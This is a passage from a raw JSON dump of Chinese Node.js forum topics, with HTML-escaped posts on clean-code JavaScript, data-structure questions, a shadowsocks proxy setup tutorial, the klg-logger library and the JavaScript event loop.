Heaven&#x27;, &#x27;Hey Jude&#x27;];\nconst Artists = [&#x27;ACDC&#x27;, &#x27;Led Zeppelin&#x27;, &#x27;The Beatles&#x27;];\n\nfunction eraseDatabase() {}\nfunction restore_database() {}\n\nclass animal {}\nclass Alpaca {}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>const DAYS_IN_WEEK = 7;\nconst DAYS_IN_MONTH = 30;\n\nconst SONGS = [&#x27;Back In Black&#x27;, &#x27;Stairway to Heaven&#x27;, &#x27;Hey Jude&#x27;];\nconst ARTISTS = [&#x27;ACDC&#x27;, &#x27;Led Zeppelin&#x27;, &#x27;The Beatles&#x27;];\n\nfunction eraseDatabase() {}\nfunction restoreDatabase() {}\n\nclass Animal {}\nclass Alpaca {}\n</code></pre><h4>先声明后调用</h4>\n<p>就像我们看报纸文章一样，从上到下看，所以为了方便阅读把函数声明写在函数调用前面。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>class PerformanceReview {\n  constructor(employee) {\n    this.employee = employee;\n  }\n\n  lookupPeers() {\n    return db.lookup(this.employee, &#x27;peers&#x27;);\n  }\n\n  lookupManager() {\n    return db.lookup(this.employee, &#x27;manager&#x27;);\n  }\n\n  getPeerReviews() {\n    const peers = this.lookupPeers();\n    &#x2F;&#x2F; ...\n  }\n\n  perfReview() {\n    this.getPeerReviews();\n    this.getManagerReview();\n    this.getSelfReview();\n  }\n\n  getManagerReview() {\n    const manager = this.lookupManager();\n  }\n\n  getSelfReview() {\n    &#x2F;&#x2F; ...\n  }\n}\n\nconst review = new PerformanceReview(employee);\nreview.perfReview();\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>class PerformanceReview {\n  constructor(employee) {\n    this.employee = employee;\n  }\n\n  perfReview() {\n    this.getPeerReviews();\n    this.getManagerReview();\n    this.getSelfReview();\n  }\n\n  getPeerReviews() {\n    const peers = this.lookupPeers();\n    &#x2F;&#x2F; ...\n  }\n\n  lookupPeers() {\n    return db.lookup(this.employee, &#x27;peers&#x27;);\n  }\n\n  getManagerReview() {\n    const manager = this.lookupManager();\n  }\n\n  lookupManager() {\n    return db.lookup(this.employee, &#x27;manager&#x27;);\n  }\n\n  getSelfReview() {\n    &#x2F;&#x2F; ...\n  }\n}\n\nconst review = new PerformanceReview(employee);\nreview.perfReview();\n</code></pre><h3>注释</h3>\n<h4>只有业务逻辑需要注释</h4>\n<p>代码注释不是越多越好。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>function hashIt(data) {\n  &#x2F;&#x2F; 这是初始值\n  let hash = 0;\n\n  &#x2F;&#x2F; 数组的长度\n  const length = data.length;\n\n  &#x2F;&#x2F; 循环数组\n  for (let i = 0; i &lt; length; i++) {\n    &#x2F;&#x2F; 获取字符代码\n    const char = data.charCodeAt(i);\n    &#x2F;&#x2F; 修改 hash\n    hash = ((hash &lt;&lt; 5) - hash) + char;\n    &#x2F;&#x2F; 转换为32位整数\n    hash &amp;= hash;\n  }\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>function hashIt(data) {\n  let hash = 0;\n  const length = data.length;\n\n  for (let i = 0; i &lt; length; i++) {\n    const char = data.charCodeAt(i);\n    hash = ((hash &lt;&lt; 5) - hash) + char;\n\n    &#x2F;&#x2F; 转换为32位整数\n    hash &amp;= hash;\n  }\n}\n</code></pre><h4>删掉注释的代码</h4>\n<p>git 存在的意义就是保存你的旧代码，所以注释的代码赶紧删掉吧。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>doStuff();\n&#x2F;&#x2F; doOtherStuff();\n&#x2F;&#x2F; doSomeMoreStuff();\n&#x2F;&#x2F; doSoMuchStuff();\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>doStuff();\n</code></pre><h4>不要记日记</h4>\n<p>记住你有 git！，<code>git log</code> 可以帮你干这事。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;**\n * 2016-12-20: 删除了 xxx\n * 2016-10-01: 改进了 xxx\n * 2016-02-03: 删除了第12行的类型检查\n * 2015-03-14: 增加了一个合并的方法\n *&#x2F;\nfunction combine(a, b) {\n  return a + b;\n}\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>function combine(a, b) {\n  return a + b;\n}\n</code></pre><h4>注释不需要高亮</h4>\n<p>注释高亮，并不能起到提示的作用，反而会干扰你阅读代码。</p>\n<p><strong>Bad:</strong></p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\n&#x2F;&#x2F; Scope Model Instantiation\n&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\n$scope.model = {\n  menu: &#x27;foo&#x27;,\n  nav: &#x27;bar&#x27;\n};\n\n&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\n&#x2F;&#x2F; Action setup\n&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\nconst actions = function() {\n  &#x2F;&#x2F; ...\n};\n</code></pre><p><strong>Good</strong></p>\n<pre class=\"prettyprint language-js\"><code>$scope.model = {\n  menu: &#x27;foo&#x27;,\n  nav: &#x27;bar&#x27;\n};\n\nconst actions = function() {\n  &#x2F;&#x2F; ...\n};\n</code></pre><p><strong>ref</strong></p>\n<blockquote>\n<p>翻译自<a href=\"https://github.com/ryanmcdermott\">ryanmcdermott</a>的<a href=\"https://github.com/ryanmcdermott/clean-code-javascript\">《clean-code-javascript》</a>，本文对原文进行了一些修改。</p>\n</blockquote>\n</div>","title":"JavaScript 代码简洁之道","last_reply_at":"2019-01-16T02:52:55.441Z","good":false,"top":false,"reply_count":6,"visit_count":1516,"create_at":"2019-01-09T03:15:10.626Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c3d56a63898674067a7f4b8","author_id":"5b03c9a7000332b81cf821a5","tab":"ask","content":"<div class=\"markdown-text\"><p>为什么说AVL树是严格平衡的，而红黑树不是严格平衡的？红黑树经过旋转不也是平衡树吗？怎么还说红黑树不是严格平衡的呢？</p>\n</div>","title":"为什么说AVL树是严格平衡的，而红黑树不是严格平衡的","last_reply_at":"2019-01-16T01:57:14.707Z","good":false,"top":false,"reply_count":1,"visit_count":802,"create_at":"2019-01-15T03:42:30.599Z","author":{"loginname":"linxiaoziruo","avatar_url":"https://avatars3.githubusercontent.com/u/6881273?v=4&s=120"}},{"id":"5c3c38313898674067a7eea3","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p>大型博客社区图片资源存储于第三方服务器，请问下如何的规则命名，才能让所有图片不重名</p>\n</div>","title":"大型博客社区图片资源存储于第三方服务器，请问下如何的规则命名，才能让所有图片不重名","last_reply_at":"2019-01-16T00:54:33.648Z","good":false,"top":false,"reply_count":7,"visit_count":906,"create_at":"2019-01-14T07:20:17.718Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"54b3fc05edf686411e1b9ce1","author_id":"53f30d44bbdaa79d51516b11","tab":"share","content":"<div class=\"markdown-text\"><p>最近天朝强的特别厉害，很多之前的免费vpn,或者穿墙方法都不好使了，对于程序员的我们，本来国内网络速度就不怎么好，如今查个文档什么的更是难上加难了，简直是阻碍科学技术的发展啊，有木有！好了废话少说，进入正题。</p>\n<h3>方法一</h3>\n<blockquote>\n<p><a href=\"http://wen.lu\">wen.lu</a></p>\n</blockquote>\n<p>大家肯定都使用过<strong><a href=\"http://wen.lu\">wen.lu</a></strong>提供的google穿墙服务，但是最近<strong><a href=\"http://wen.lu\">wen.lu</a></strong>也不怎么好使，经常打不开。其实<strong><a href=\"http://wen.lu\">wen.lu</a></strong>的作者最近开源了他的这个代理程序，详情请点击：<a href=\"https://github.com/cuber/ngx_http_google_filter_module/blob/master/README.zh-CN.md\">Github</a>\n这种方法利用了<strong>nginx</strong>，依赖了不少东西，而且有个缺点，不能全局代理。今天我介绍利用另外一个开源软件来做。</p>\n<h3>方法二</h3>\n<hr>\n<blockquote>\n<p>shadowsocks <a href=\"https://github.com/shadowsocks/shadowsocks\">Github</a></p>\n</blockquote>\n<p>这两种开源软件都需要一个共同点，就是首先你得有一台<strong>可翻墙的VPS服务器</strong>，用这台服务器做跳板。所以各位朋友注意咯。目前我用的服务器是<a href=\"https://www.digitalocean.com/\">DigitalOcean</a>，每月30块，当然还有些朋友用<a href=\"https://www.linode.com/\">linode</a>, 还有<a href=\"http://aws.amazon.com/cn/\">AWS</a>.</p>\n<p>各大vps操作系统的安装方法，官方文档有解释。题主<strong>VPS</strong>的操作系统为<strong>Ubutun</strong>.如果对英文文档不感冒的朋友，可以请看<a href=\"http://shadowsocks.cn/\">这里</a>.\n我用的是<strong>NodeJS</strong>版本，所以直接用<strong>NPM</strong>执行：</p>\n<blockquote>\n<p>$ npm install -g shadowsocks</p>\n</blockquote>\n<p>安装完成后，切换目录到<strong>node_module</strong>下的<strong>shadowsocks</strong>下，修改<strong>config.json</strong>中的配置如下：\n<code>{ &quot;server&quot;:&quot;my_server_ip&quot;, &quot;server_port&quot;:443, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;barfoo!&quot;, &quot;timeout&quot;:600, &quot;method&quot;:&quot;table&quot; }</code>\n<em>注意 server_port 这个端口，尽量避免占用。</em>\n配置好后，调用命令启动：</p>\n<blockquote>\n<p>$ ssserver</p>\n</blockquote>\n<p>由于我这里使用的是<strong>NodeJS</strong>版本，所以我这里装了个<a href=\"https://github.com/foreverjs/forever\">forever</a>来协助运行服务。 其他版本的就不必了。</p>\n<blockquote>\n<p>客户端使用</p>\n</blockquote>\n<p>题主操作系统为OSX, 如果你已经安装过Goagent了，那就不必下载这个客户端软件了- <strong>shadowsocks <strong>,\n打开</strong>AppStore</strong> 就能搜索到这款代理软件。安装后启动，选择服务器设定- 选择自定义- 设置之前配置的服务器配置以及密码等信息。最后打开浏览器试试吧！</p>\n<blockquote>\n<p>注意，<strong>Chrome</strong> 由于一些安全方面的原因，不能直接访问，你需要手动配置一下代理设置，右侧菜单-设置-显示高级设置-网络-更改代理服务器设置-勾选socks代理设置,\n<code>IP:127.0.0.1 端口： 1080</code>\n这里我推荐一款chrome代理扩展管理的应用<a href=\"http://switchysharp.com/\">Proxy SwitchySharp</a>,设置方法与上面类似。</p>\n</blockquote>\n<p>好了，大家快去试试吧！</p>\n<hr>\n<p>作者： <a href=\"http://imziv.com\">Ziv小威</a></p>\n<p>Blog: <a href=\"http://imziv.com\">http://imziv.com</a></p>\n<p>Date: 2015年1月13日</p>\n</div>","title":"谁也阻挡不了我穿墙！！搭建自己的VPN","last_reply_at":"2019-01-15T12:33:42.261Z","good":false,"top":false,"reply_count":48,"visit_count":387872,"create_at":"2015-01-12T16:53:25.707Z","author":{"loginname":"wewoor","avatar_url":"https://avatars0.githubusercontent.com/u/2766811?v=4&s=120"}},{"id":"5c3dcc7a3898674067a7f886","author_id":"5c185243f3d48d2397c12456","tab":"share","content":"<div class=\"markdown-text\"><p>地址： <a href=\"http://47.112.16.176\">http://47.112.16.176</a></p>\n<p>github: <a href=\"https://github.com/153913232a/webpack-vue\">https://github.com/153913232a/webpack-vue</a></p>\n<p></p>\n<p>vue学了也有一段时间了，所以想着做点东西，刚好cnode社区提供了比较完善的api，花了一个星期的时间模仿cnode做了一个移动端的社区，样式参考的是http://react-china.org/t/webpack-react-react-router-redux-less-flex-css-es6-react-cnode/6332 这位大佬，他用的是react，写得很6，有时间可以详细看一下。</p>\n</div>","title":"webpack+vue 模仿cnode社区","last_reply_at":"2019-01-15T12:05:14.241Z","good":false,"top":false,"reply_count":0,"visit_count":585,"create_at":"2019-01-15T12:05:14.241Z","author":{"loginname":"153913232a","avatar_url":"https://avatars2.githubusercontent.com/u/31944770?v=4&s=120"}},{"id":"5c3db9483898674067a7f825","author_id":"511350f6df9e9fcc58856443","tab":"share","content":"<div class=\"markdown-text\"><h1>klg-logger</h1>\n<h2>前言</h2>\n<p>今天给大家介绍 logger日志工具的使用，用dev的小哥哥的话说：log 工具，基于 tracer，简单，可以显示 log 的位置。<br>\n详情请看以下配置方法，有问题欢迎在评论区提出！</p>\n<h2>配置</h2>\n<p>3.0 版本开始，将不对 tracer 做任何封装，直接使用 Tracer</p>\n<p>详细用法见 tracer 文档<a href=\"https://www.npmjs.com/package/tracer\">https://www.npmjs.com/package/tracer</a></p>\n<h2>基本用法</h2>\n<h3>简单版本</h3>\n<p>默认版本是把 log 输出到 console</p>\n<pre class=\"prettyprint\"><code>js\nimport { Logger } from &#x27;klg-logger&#x27;\n\nconst logger = Logger({\n  level: config.get(&#x27;log.level&#x27;),\n  dateformat: &#x27;yyyy-mm-dd HH:MM:ss.L&#x27;,\n  inspectOpt: {\n    showHidden: false, &#x2F;&#x2F; if true then the object&#x27;s non-enumerable properties will be shown too. Defaults to false\n    depth: 5 &#x2F;&#x2F; tells inspect how many times to recurse while formatting the object. This is useful for inspecting large complicated objects. Defaults to 2. To make it recurse indefinitely pass null.\n  }\n})\n\nlogger.info(&#x27;hello world&#x27;)\nlogger.debug(&#x27;hello %s&#x27;, &#x27;world&#x27;)\nlogger.error(&#x27;hello %s&#x27;, &#x27;error&#x27;)\n\nexport {logger}  \n\n</code></pre><p>配置项的详细解释：</p>\n<pre class=\"prettyprint\"><code>interface LoggerConfig {\n    &#x2F;**\n     * Output format (Using &#96;tinytim&#96; templating)\n     *\n     * Defaults to: &#96;&quot;{{timestamp}} &lt;{{title}}&gt; {{file}}:{{line}} ({{method}}) {{message}}&quot;&#96;\n     *\n     * Possible values:\n     * - timestamp: current time\n     * - title: method name, default is &#x27;log&#x27;, &#x27;trace&#x27;, &#x27;debug&#x27;, &#x27;info&#x27;, &#x27;warn&#x27;, &#x27;error&#x27;,&#x27;fatal&#x27;\n     * - level: method level, default is &#x27;log&#x27;:0, &#x27;trace&#x27;:1, &#x27;debug&#x27;:2, &#x27;info&#x27;:3, &#x27;warn&#x27;:4, &#x27;error&#x27;:5, &#x27;fatal&#x27;:6\n     * - message: printf message, support %s string, %d number, %j JSON and auto inspect\n     * - file: file name\n     * - line: line number\n     * - pos: position\n     * - path: file&#x27;s path\n     * - method: method name of caller\n     * - stack: call stack message\n     *&#x2F;\n    format?: string | [string, LevelOption&lt;string&gt;];\n    &#x2F;**\n     * Datetime format (Using &#96;Date Format&#96;)\n     *&#x2F;\n    dateformat?: string;\n    filters?: FilterFunction[] | LevelOption&lt;FilterFunction&gt; | Array&lt;FilterFunction | LevelOption&lt;FilterFunction | FilterFunction[]&gt;&gt;;\n    &#x2F;**\n     * Output the log, if level of log larger than or equal to &#96;level&#96;.\n     *&#x2F;\n    level?: string | number;\n    methods?: string[];\n    &#x2F;**\n     * Get the specified index of stack as file information. It is useful for development package.\n     *&#x2F;\n    stackIndex?: number;\n    inspectOpt?: {\n        &#x2F;**\n         * If true then the object&#x27;s non-enumerable properties will be shown too. Defaults to false.\n         *&#x2F;\n        showHidden: boolean,\n        &#x2F;**\n         * Tells inspect how many times to recurse while formatting the object.\n         * This is useful for inspecting large complicated objects.\n         * Defaults to 2. To make it recurse indefinitely pass null.\n         *&#x2F;\n        depth: number\n    };\n\n    &#x2F;**\n     * Pre-process the log object.\n     *&#x2F;\n    preprocess?(data: LogOutput): void;\n    &#x2F;**\n     * Transport function (e.g. console.log)\n     *&#x2F;\n    transport?: TransportFunction | TransportFunction[];\n}\n</code></pre><h3>自定义 transport</h3>\n<p>如果你需要把 log 输出到文件或者发送其他地方，可以自定义 transport function</p>\n<pre class=\"prettyprint language-js\"><code>import { Logger } from &#x27;klg-logger&#x27;\nconst logger = new Logger({\n  level: &#x27;log&#x27;,\n  transport: function (data: Tracer.LogOutput) {\n    &#x2F;&#x2F; 写文件\n    fs.write(data)\n    &#x2F;&#x2F; 发送其他地址\n    tcp.send(data)\n\n    assert(data)\n    assert(data.level === 0)\n  }\n})\nlogger.log(&#x27;hello world&#x27;)\n</code></pre><h3>每日分割日志</h3>\n<p>如果你需要把 log 输出到文件或者发送其他地方，可以自定义 transport function</p>\n<pre class=\"prettyprint language-js\"><code>import { LoggerDaily } from &#x27;klg-logger&#x27;\nconst logger = LoggerDaily({\n  root: &#x27;&#x2F;data&#x2F;app&#x2F;log&#x27;,\n  maxLogFiles: 10,\n  allLogsFileName : true,\n  level: &#x27;log&#x27;\n})\nlogger.log(&#x27;hello world&#x27;)\nlogger.err = logger.error\nlogger.err(&#x27;hello world&#x27;)\n</code></pre><p>配置字段：</p>\n<pre class=\"prettyprint\"><code>interface DailyFileConfig {\n    &#x2F;**\n     * All daily log file&#x27;s dir, default to: &#96;&#x27;.&#x27;&#96;.\n     *&#x2F;\n    root?: string;\n    &#x2F;**\n     * Log file path format.\n     *\n     * Default to: &#96;&#x27;{{root}}&#x2F;{{prefix}}.{{date}}.log&#x27;&#96;\n     *\n     * Possible values:\n     * - &#96;root&#96;: all daily log file&#x27;s dir, default to: &#96;&#x27;.&#x27;&#96;.\n     * - &#96;prefix&#96;: it equal to &#96;allLogsFileName&#96;, if &#96;allLogsFileName&#96; is provided; else it will be the method name.\n     * - &#96;date&#96;: today&#x27;s date.\n     *&#x2F;\n    logPathFormat?: string;\n    &#x2F;**\n     * Datetime format (Using &#96;Date Format&#96;)\n     *&#x2F;\n    splitFormat?: string;\n    &#x2F;**\n     * If &#96;allLogsFileName&#96; is provided then all level logs will be move to one daily log file.\n     *&#x2F;\n    allLogsFileName?: boolean;\n    maxLogFiles?: number;\n}\n</code></pre><hr>\n<p>著作权归本文作者所有，未经授权，请勿转载，谢谢。</p>\n</div>","title":"AI考拉技术分享-Node基础架构专题（二）","last_reply_at":"2019-01-15T10:43:20.199Z","good":false,"top":false,"reply_count":0,"visit_count":634,"create_at":"2019-01-15T10:43:20.199Z","author":{"loginname":"kalengo","avatar_url":"https://avatars2.githubusercontent.com/u/8817810?v=4&s=120"}},{"id":"5c3d554fa4d44449266b1077","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><h3>前言</h3>\n<p>本文我们将会介绍 JS 实现异步的原理，并且了解了在浏览器和 Node 中 Event Loop 其实是不相同的。</p>\n<h3>一、线程与进程</h3>\n<h4>1. 概念</h4>\n<p>我们经常说 JS 是单线程执行的，指的是一个进程里只有一个主线程，那到底什么是线程？什么是进程？</p>\n<p>官方的说法是：<strong>进程是 CPU 资源分配的最小单位；线程是 CPU 调度的最小单位</strong>。这两句话并不好理解，我们先来看张图：</p>\n<p><img src=\"https://image.fundebug.com/2019-01-14-001.png\" alt></p>\n<ul>\n<li>进程好比图中的工厂，有单独的专属自己的工厂资源。</li>\n<li>线程好比图中的工人，多个工人在一个工厂中协作工作，工厂与工人是 1:n 的关系。也就是说<strong>一个进程由一个或多个线程组成，线程是一个进程中代码的不同执行路线</strong>；</li>\n<li>工厂的空间是工人们共享的，这象征<strong>一个进程的内存空间是共享的，每个线程都可用这些共享内存</strong>。</li>\n<li>多个工厂之间独立存在。</li>\n</ul>\n<h4>2. 多进程与多线程</h4>\n<ul>\n<li>多进程：在同一个时间里，同一个计算机系统中如果允许两个或两个以上的进程处于运行状态。多进程带来的好处是明显的，比如你可以听歌的同时，打开编辑器敲代码，编辑器和听歌软件的进程之间丝毫不会相互干扰。</li>\n<li>多线程：程序中包含多个执行流，即在一个程序中可以同时运行多个不同的线程来执行不同的任务，也就是说允许单个程序创建多个并行执行的线程来完成各自的任务。</li>\n</ul>\n<p>以 Chrome 浏览器中为例，当你打开一个 Tab 页时，其实就是创建了一个进程，一个进程中可以有多个线程（下文会详细介绍），比如渲染线程、JS 引擎线程、HTTP 请求线程等等。当你发起一个请求时，其实就是创建了一个线程，当请求结束后，该线程可能就会被销毁。</p>\n<h3>二、浏览器内核</h3>\n<p>简单来说浏览器内核是通过取得页面内容、整理信息（应用 CSS）、计算和组合最终输出可视化的图像结果，通常也被称为渲染引擎。</p>\n<p>浏览器内核是多线程，在内核控制下各线程相互配合以保持同步，一个浏览器通常由以下常驻线程组成：</p>\n<ul>\n<li>GUI 渲染线程</li>\n<li>JavaScript 引擎线程</li>\n<li>定时触发器线程</li>\n<li>事件触发线程</li>\n<li>异步 http 请求线程</li>\n</ul>\n<h4>1. GUI 渲染线程</h4>\n<ul>\n<li>主要负责页面的渲染，解析 HTML、CSS，构建 DOM 树，布局和绘制等。</li>\n<li>当界面需要重绘或者由于某种操作引发回流时，将执行该线程。</li>\n<li>该线程与 JS 引擎线程互斥，当执行 JS 引擎线程时，GUI 渲染会被挂起，当任务队列空闲时，JS 引擎才会去执行 GUI 渲染。</li>\n</ul>\n<h4>2. JS 引擎线程</h4>\n<ul>\n<li>该线程当然是主要负责处理 JavaScript 脚本，执行代码。</li>\n<li>也是主要负责执行准备好待执行的事件，即定时器计数结束，或者异步请求成功并正确返回时，将依次进入任务队列，等待 JS 引擎线程的执行。</li>\n<li>当然，该线程与 GUI 渲染线程互斥，当 JS 引擎线程执行 JavaScript 脚本时间过长，将导致页面渲染的阻塞。</li>\n</ul>\n<h4>3. 定时器触发线程</h4>\n<ul>\n<li>负责执行异步定时器一类的函数的线程，如： setTimeout，setInterval。</li>\n<li>主线程依次执行代码时，遇到定时器，会将定时器交给该线程处理，当计数完毕后，事件触发线程会将计数完毕后的事件加入到任务队列的尾部，等待 JS 引擎线程执行。</li>\n</ul>\n<h4>4. 事件触发线程</h4>\n<ul>\n<li>主要负责将准备好的事件交给 JS 引擎线程执行。</li>\n</ul>\n<p>比如 setTimeout 定时器计数结束， ajax 等异步请求成功并触发回调函数，或者用户触发点击事件时，该线程会将整装待发的事件依次加入到任务队列的队尾，等待 JS 引擎线程的执行。</p>\n<h4>5. 异步 http 请求线程</h4>\n<ul>\n<li>负责执行异步请求一类的函数的线程，如： Promise，axios，ajax 等。</li>\n<li>主线程依次执行代码时，遇到异步请求，会将函数交给该线程处理，当监听到状态码变更，如果有回调函数，事件触发线程会将回调函数加入到任务队列的尾部，等待 JS 引擎线程执行。</li>\n</ul>\n<h3>三、浏览器中的 Event Loop</h3>\n<h4>1. Micro-Task 与 Macro-Task</h4>\n<p>事件循环中的异步队列有两种：macro（宏任务）队列和 micro（微任务）队列。<strong>宏任务队列可以有多个，微任务队列只有一个</strong>。</p>\n<ul>\n<li>常见的 macro-task 比如：setTimeout、setInterval、 setImmediate、script（整体代码）、 I/O 操作、UI 渲染等。</li>\n<li>常见的 micro-task 比如: process.nextTick、new Promise().then(回调)、MutationObserver(html5 新特性) 等。</li>\n</ul>\n<h4>2. Event Loop 过程解析</h4>\n<p>一个完整的 Event Loop 过程，可以概括为以下阶段：</p>\n<p><img src=\"https://image.fundebug.com/2019-01-14-002.png\" alt></p>\n<ul>\n<li>\n<p>一开始执行栈空,我们可以把<strong>执行栈认为是一个存储函数调用的栈结构，遵循先进后出的原则</strong>。micro 队列空，macro 队列里有且只有一个 script 脚本（整体代码）。</p>\n</li>\n<li>\n<p>全局上下文（script 标签）被推入执行栈，同步代码执行。在执行的过程中，会判断是同步任务还是异步任务，通过对一些接口的调用，可以产生新的 macro-task 与 micro-task，它们会分别被推入各自的任务队列里。同步代码执行完了，script 脚本会被移出 macro 队列，这个过程本质上是队列的 macro-task 的执行和出队的过程。</p>\n</li>\n<li>\n<p>上一步我们出队的是一个 macro-task，这一步我们处理的是 micro-task。但需要注意的是：当 macro-task 出队时，任务是<strong>一个一个</strong>执行的；而 micro-task 出队时，任务是<strong>一队一队</strong>执行的。因此，我们处理 micro 队列这一步，会逐个执行队列中的任务并把它出队，直到队列被清空。</p>\n</li>\n<li>\n<p><strong>执行渲染操作，更新界面</strong></p>\n</li>\n<li>\n<p>检查是否存在 Web worker 任务，如果有，则对其进行处理</p>\n</li>\n<li>\n<p>上述过程循环往复，直到两个队列都清空</p>\n</li>\n</ul>\n<p>我们总结一下，每一次循环都是一个这样的过程：</p>\n<p><img src=\"https://image.fundebug.com/2019-01-14-003.png\" alt></p>\n<p><strong>当某个宏任务执行完后,会查看是否有微任务队列。如果有，先执行微任务队列中的所有任务，如果没有，会读取宏任务队列中排在最前的任务，执行宏任务的过程中，遇到微任务，依次加入微任务队列。栈空后，再次读取微任务队列里的任务，依次类推。</strong></p>\n<p>接下来我们看道例子来介绍上面流程：</p>\n<pre class=\"prettyprint language-javascript\"><code>Promise.resolve().then(()=&gt;{\n  console.log(&#x27;Promise1&#x27;)\n  setTimeout(()=&gt;{\n    console.log(&#x27;setTimeout2&#x27;)\n  },0)\n})\nsetTimeout(()=&gt;{\n  console.log(&#x27;setTimeout1&#x27;)\n  Promise.resolve().then(()=&gt;{\n    console.log(&#x27;Promise2&#x27;)\n  })\n},0)\n</code></pre><p>最后输出结果是 Promise1，setTimeout1，Promise2，setTimeout2</p>\n<ul>\n<li>一开始执行栈的同步任务（这属于宏任务）执行完毕，会去查看是否有微任务队列，上题中存在(有且只有一个)，然后执行微任务队列中的所有任务输出 Promise1，同时会生成一个宏任务 setTimeout2</li>\n<li>然后去查看宏任务队列，宏任务 setTimeout1 在 setTimeout2 之前，先执行宏任务 setTimeout1，输出 setTimeout1</li>\n<li>在执行宏任务 setTimeout1 时会生成微任务 Promise2 ，放入微任务队列中，接着先去清空微任务队列中的所有任务，输出 Promise2</li>\n<li>清空完微任务队列中的所有任务后，就又会去宏任务队列取一个，这回执行的是 setTimeout2</li>\n</ul>\n<h3>四、Node 中的 Event Loop</h3>\n<h4>1. Node 简介</h4>\n<p>Node 中的 Event Loop 和浏览器中的是完全不相同的东西。Node.js 采用 V8 作为 js 的解析引擎，而 I/O 处理方面使用了自己设计的 libuv，libuv 是一个基于事件驱动的跨平台抽象层，封装了不同操作系统一些底层特性，对外提供统一的 API，事件循环机制也是它里面的实现（下文会详细介绍）。</p>\n<p><img src=\"https://image.fundebug.com/2019-01-14-004.png\" alt></p>\n<p>Node.js 的运行机制如下:</p>\n<ul>\n<li>V8 引擎解析 JavaScript 脚本。</li>\n<li>解析后的代码，调用 Node API。</li>\n<li>libuv 库负责 Node API 